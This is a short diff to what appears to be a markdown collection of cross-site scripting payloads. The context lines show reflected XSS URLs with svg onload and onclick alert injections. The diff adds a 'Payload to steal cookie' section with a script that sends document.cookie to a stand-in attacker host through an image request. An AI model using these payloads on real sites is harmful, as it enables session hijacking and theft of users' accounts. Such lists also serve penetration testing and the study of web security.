@@ -202,3 +202,7 @@ host+/_ignition/scripts/--%3E%3Csvg%20onload=alert('XSS')%3E
 https://REDACTED/subscribe?source=mllamazares%22%20accesskey=%22X%22%20onclick=%22alert(document.domain)%22/%3EPress%20Alt%2BShift%2BX%20to%20continue%20
 ```
 
+## Payload to steal cookie
+```js
+<script>new Image().src="http://yourdomain.io/"+document.cookie;</script>
+```
